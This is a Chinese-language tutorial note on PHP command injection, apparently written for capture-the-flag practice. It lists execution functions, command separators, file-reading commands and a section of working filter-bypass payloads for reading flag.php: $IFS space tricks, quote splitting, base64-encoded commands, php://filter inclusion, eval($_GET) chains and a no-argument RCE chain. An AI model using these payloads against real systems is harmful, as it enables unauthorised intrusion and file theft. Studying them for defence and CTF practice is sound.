# 基本概念
当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 `system`、`exec`、`shell_exec` 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击
# 漏洞产生条件
- 调用第三方组件存在代码执行漏洞
- 用户的输入作为系统命令的参数拼接到命令中
- 对用户的输入过滤不严格
# 常用Linux命令

| 文件目录命令   | 参数                                                                                                                                                                                                          | 用法  |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| ls 命令    | -a 查看隐藏的文件<br>-l 查看详细信息，属性<br>-d 查看目录本身的属性<br>-r 逆序排序显示文件<br>-t 按照时间顺序排序                                                                                                                                    |     |
| cd 命令    | cd   /tmp 切换到tmp目录下<br>cd -    快速返回上一次所在的目录<br>cd     到家目录<br>cd ~    到家目录                                                                                                                                  |     |
| pwd 命令   | 打印当前的工作目录                                                                                                                                                                                                   |     |
| touch 命令 | 创建普通文件，如果文件存在则只修改时间 时间和时间戳                                                                                                                                                                                  |     |
| cat 命令   | cat -n test.txt 显示行号<br>cat << EOF 可以输入内容，以EOF结束                                                                                                                                                            |     |
| mkdir 命令 | -p 目录不存在则创建，存在不提示错误                                                                                                                                                                                         |     |
| cp 命令    | -r   复制目录<br>-a  此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容。<br>-f 这个选项不太强，压制不住别名中的-i选项                                                                                                                           |     |
| mv 命令    | -f 移动文件或目录时，不询问直接覆盖（这个-f 比较厉害，别名中的-i不顶用，直接覆盖）<br>当用mv移动一个目录时，直接实现了递归转移<br>mv /etc/skel/* ~/ 如果把root家目录中的隐藏文件给删除了，相当于把登录环境删了，相当于房子变成了毛坯房。                                                                    |     |
| rm命令     | -r   删除目录及目录下面所有的文件<br>-f   强制删除不提示 (这个-f 比较厉害，别名中的-i不顶用，直接删除)<br>**rm注意事项**<br>- 用这个命令一定要注意，想清楚了再执行。<br>- 看清楚下面三者的区别，**珍爱生命，谨慎使用！！！**  <br>    `rm -rf /`  强制删除根目录下所有东东  <br>    `rm -rf *`  强制删除当前目录的所有文件 |     |
| echo     | - ehco 123  输出123内容到屏幕上<br>- echo {1…10}<br>- echo echo {1…10…1}<br>- echo {1…10…2}                                                                                                                         |     |

| 命令查找命令     | 参数                 | 用法  |
| ---------- | ------------------ | --- |
| which 命令   | 功能描述：搜索命令所在目录及别名信息 |     |
| whereis 命令 | 功能描述：搜索命令所在目录及帮助文档 |     |

| 帮助命令   | 用法            |
| ------ | ------------- |
| man命令  | 查看外置命令帮助      |
| help命令 | 查看shell内置命令帮助 |

# 执行函数

| 执行函数         | 功能                                                                                                      | 例子                                                                |
| ------------ | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| system()     | **功能**：执行外部命令并输出结果<br>**特点**：<br>- 直接输出命令执行结果到标准输出<br>- 返回值为命令输出的最后一行<br>- 执行失败返回FALSE                  | `$output = system('ls -la', $retval);`                            |
| passthru()   | **功能**：执行外部命令并直接显示原始输出<br>**特点**：<br>- 直接将命令输出发送到浏览器<br>- 不返回任何结果，但可以获取退出状态码<br>- 适合处理二进制数据             | `passthru('cat /etc/passwd', $retval);`                           |
| exec()       | **功能**：执行外部命令<br>**特点**：<br>- 默认不输出结果，只返回最后一行<br>- 可以通过第二个参数获取完整输出数组<br>- 第三个参数可以获取返回值                  | `exec('ls -la', $output, $retval);`                               |
| pcntl_exec() | **功能**：在当前进程空间执行指定程序<br>**特点**：<br>- 不返回任何值<br>- 需要pcntl扩展支持<br>- 执行后会替换当前进程                            |                                                                   |
| shell_exec() | **功能**：通过shell执行命令并返回完整输出<br>**特点**<br>- 返回命令的完整输出（字符串形式）<br>- 执行错误或空输出返回NULL<br>- 相当于反引号操作符            | `$output = shell_exec('ls -la');`                                 |
| popen()      | **功能**：打开进程文件指针<br>**特点**：<br>- 返回文件指针，不直接输出<br>- 可以单向读取或写入<br>- 需要fread/fgets等函数读取输出                   | `$handle = popen('ls -la', 'r');`<br>`echo fread($handle, 4096);` |
| proc_open()  | **功能**：执行命令并打开文件指针进行I/O<br>**特点**：<br>- 比popen()更强大，支持双向通信<br>- 可以控制进程的STDIN/STDOUT/STDERR<br>- 配置复杂但灵活 |                                                                   |
| 反引号          | **功能**：与shell_exec()相同<br>**特点**<br>- 语法简洁<br>- 返回完整输出<br>- 在禁用函数时可能被忽略                                 | `$output = ``ls -``la`;                                           |
| ob_start()   | 用于打开缓冲区，开始输出缓冲, 这时PHP停止输出, 在这以后的输出都被转到一个内部的缓冲里。                                                         |                                                                   |

# 命令连接符
主要是有`; | || & &&`这几种
```
command1&command2 两个命令同时执行
command1&&command2 只有前面命令执行成功，后面命令才继续执行
command1;command2 不管前面命令执行成功没有，后面的命令继续执行
command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令
command1|command2 上一条命令的输出，作为下一条命令参数
```

# 模糊匹配
?与*
`*`可以匹配多个字符，`？`只能匹配一个字符

# 常用读取文件命令

| 命令   | 功能                  | 参数                                                                                                                                                                                           | 例子                                                                                                                                                                                                          |
| ---- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cat  | 连接文件并打印到标准输出设备      | - `-n` 或 `--number`：显示行号<br>- `-b` 或 `--number-nonblank`：对非空行编号<br>- `-s` 或 `--squeeze-blank`：将多个空行压缩为一个空行<br>- `-A`：显示所有内容，包括特殊字符(等同于`-vET`)                                                | `cat /etc/passwd                    # 查看文件内容`<br>`cat -n /etc/passwd                 # 带行号显示`<br>`cat file1 file2 > file3            # 合并文件`<br>`cat > newfile.txt                  # 创建新文件(输入内容后Ctrl+D保存)` |
| tac  | 反向显示文件内容(从最后一行到第一行) | - `-b` 或 `--before`：在行前而非行尾添加分隔标志<br>- `-r` 或 `--regex`：将分隔标志视为正则表达式<br>- `-s` 或 `--separator`：指定分隔标志(默认为换行符)                                                                                | `tac /etc/passwd            # 反向显示文件`<br>`tac -s ':' /etc/passwd     # 以冒号为分隔符反向显示`                                                                                                                         |
| nl   | 添加行号显示文件内容          | - `-b a`：对所有行编号(包括空行)<br>- `-b t`：只对非空行编号(默认)<br>- `-n ln`：行号左对齐<br>- `-n rn`：行号右对齐<br>- `-n rz`：行号右对齐，前面补0<br>- `-w`：设置行号位数                                                                 | `nl /etc/passwd             # 显示文件并添加行号`<br>`nl -b a /etc/passwd        # 包括空行也编号`<br>`nl -n rz -w 3 /etc/passwd  # 3位数行号，前面补0`                                                                             |
| more | 分页显示文件内容(只能向前翻页)    | - 空格键：向下翻一页<br>- Enter键：向下翻一行<br>- `q`：退出<br>- `/字符串`：搜索指定字符串<br>- `=`：显示当前行号<br>- `:f`：显示文件名和当前行号                                                                                           | `more /var/log/syslog       # 分页查看日志文件`<br>`cat large_file.txt \| more  # 通过管道分页查看`                                                                                                                         |
| less | 分页显示文件内容(可前后翻页)     | - 空格键/f：向下翻一页<br>- b：向上翻一页<br>- j：向下移动一行<br>- k：向上移动一行<br>- `/字符串`：向下搜索<br>- `?字符串`：向上搜索<br>- `n`：重复前一个搜索<br>- `N`：反向重复前一个搜索<br>- `g`：跳到文件开头<br>- `G`：跳到文件末尾<br>- `q`：退出                     | `less /var/log/syslog       # 查看日志文件`<br>`ps aux \| less             # 通过管道查看进程信息`                                                                                                                          |
| head | 显示文件开头部分            | - `-n` 或 `--lines`：指定显示的行数<br>- `-c` 或 `--bytes`：指定显示的字节数<br>- `-q`：不显示文件名头<br>- `-v`：总是显示文件名头                                                                                               | `head /etc/passwd           # 默认显示前10行`<br>`head -n 5 /etc/passwd      # 显示前5行`<br>`head -c 100 /etc/passwd    # 显示前100字节`                                                                                  |
| tail | 显示文件末尾部分            | - `-n` 或 `--lines`：指定显示的行数<br>- `-c` 或 `--bytes`：指定显示的字节数<br>- `-f` 或 `--follow`：实时追踪文件变化(常用于日志)<br>- `-F`：同`-f`，但会重试(文件被轮转时有用)<br>- `-q`：不显示文件名头<br>- `-v`：总是显示文件名头                         | `tail /var/log/syslog       # 查看日志文件末尾`<br>`tail -n 20 /etc/passwd     # 显示最后20行`<br>`tail -f /var/log/auth.log  # 实时监控认证日志`                                                                                |
| od   | 以特定格式显示文件内容(默认八进制)  | - `-a`：显示命名字符<br>- `-c`：显示ASCII字符或转义字符<br>- `-d`：无符号十进制显示<br>- `-o`：八进制显示(默认)<br>- `-x`：十六进制显示<br>- `-t`：指定输出格式<br>- `-A`：指定地址基数(d十进制, o八进制, x十六进制, n无)<br>- `-j`：跳过指定字节数<br>- `-N`：限制显示的字节数 | `od -c /bin/ls             # 查看二进制文件的ASCII表示`<br>`od -x /etc/passwd         # 十六进制显示文件`<br>`od -t x1 -A n flag.txt    # 紧凑的十六进制显示(无地址)`                                                                     |
| pr   | 格式化文本文件以便打印(分页、多列等) | - `-d`：双倍行距<br>- `-h`：指定页眉替代文件名<br>- `-l`：设置页长度(行数)<br>- `-o`：设置左边距<br>- `-w`：设置页面宽度<br>- `-n`：添加行号<br>- `-m`：并行打印多个文件(多列)                                                                   | `pr -l 40 /etc/passwd      # 设置每页40行`<br>`pr -n -t /etc/passwd      # 添加行号且不显示页眉页脚`<br>`pr -m file1 file2         # 并行打印两个文件(两列)`                                                                           |
|      |                     |                                                                                                                                                                                              |                                                                                                                                                                                                             |

# 绕过空格过滤
```
{cat,flag.php} //cat flag.php
%20		空格的url编码
%09		tab键	
%0a		回车
\$IFS\$9
\${IFS}
$IFS
${IFS}
<
```

# 无参数的RCE
```
highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```
需要用到的函数  
localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)  
scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件  
pos()：返回数组中的当前元素的值。  
array_reverse()：数组逆序  
next()： 函数将内部指针指向数组中的下一个元素，并输出。  
highlight_file()：函数进行文件内容的读取，并输出

# 各种绕过姿势
## 使用转义符号
```
ca\t /fl\ag
cat fl''ag
```
## 拼接法
```
a=fl;b=ag;cat$IFS$a$b
```
## 反引号绕过
```
cat `ls`//cat system("ls");
```
## base64编码绕过
```
`echo Y2F0Cg==|base64 -d` flag
//cat的base64编码为Y2F0Cg==
```
## 配合文件包含
```
include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```
## 配合传参
```
eval($_GET[1]);&1=system("ls%20/");
```
## 拷贝文件或者修改文件名
```
system("cp fla*.php 1.txt");
system("mv fla*.php 1.txt");
```
## 调用bin
```
/bin/?at${IFS}f???????
```
```
在Linux中，/bin是安装基本系统管理命令和二进制文件的文件夹。这些二进制文件是指执行文件，通常包含在系统启动过程中需要的工具和命令行工具。/bin目录中包含了大量的基本命令和工具，包括：
 
\1. bash - 标准的命令行Shell
\2. cat - 将文件内容输出到屏幕
\3. cp - 复制文件
\4. date - 显示或设置系统时间
\5. mv - 移动或重命名文件
\6. pwd - 显示当前所在的工作目录
\7. rm - 删除文件或目录
\8. touch - 新建空白文件或更改文件的访问和修改时间
```
